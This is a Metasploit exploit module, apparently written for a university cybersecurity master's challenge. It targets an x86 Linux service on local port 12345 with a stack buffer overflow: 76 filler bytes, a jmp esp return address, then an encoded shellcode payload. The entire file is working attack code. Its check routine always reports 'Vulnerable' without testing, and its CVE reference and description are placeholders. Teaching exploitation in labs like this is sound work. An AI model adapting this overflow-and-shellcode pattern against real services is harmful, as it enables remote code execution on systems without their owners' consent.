require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'Reto HE (shellcode) - UGR Master Ciberseguridad',
      'Description'	=> %q{
		Esta es la descripción del módulo. 
      },
      'Author'	=> [ 'Gabriel Macia Fernandez <gmacia@ugr.es>' ], 
      'Arch'		=> [ARCH_X86],
      'Platform'	=> 'linux',
      'References'	=>
        [
          [ 'CVE', '2017-x000' ],
        ],
      'Privileged'	=> false,
      'License'	=> MSF_LICENSE,
      'Payload'	=> {},
      'Targets'	=>
        [
          [ 'Linux (any)', {
		  'Arch' => ARCH_X86,
		  'Ret' => 0x804a283 #jmp esp
	  }
	  ],
        ],
      'DefaultTarget'	=> 0,
      'DisclosureDate'  => 'Feb 2 2019'
    ))

    register_options(
      [
        Opt::RPORT(12345),
        Opt::RHOST('127.0.0.1')
      ],
      self.class
    )
  end

  def check
    return Exploit::CheckCode::Vulnerable
  end

  def exploit
    connect
    initial_status = sock.get
    print_status("Preparing buffer (76 bytes + RET2ESP (#{[target.ret].pack('I')} + payload \n")
    # Build the buffer for transmission
    buf = "A" * 76 
    #buf << "\x83\xa2\x04\x08"
    buf << [target.ret].pack('I')
    buf << payload.encoded
    buf << "\n"
    
    sock.put(buf)
    status = sock.get
    print_status("#{status}")
  end
end
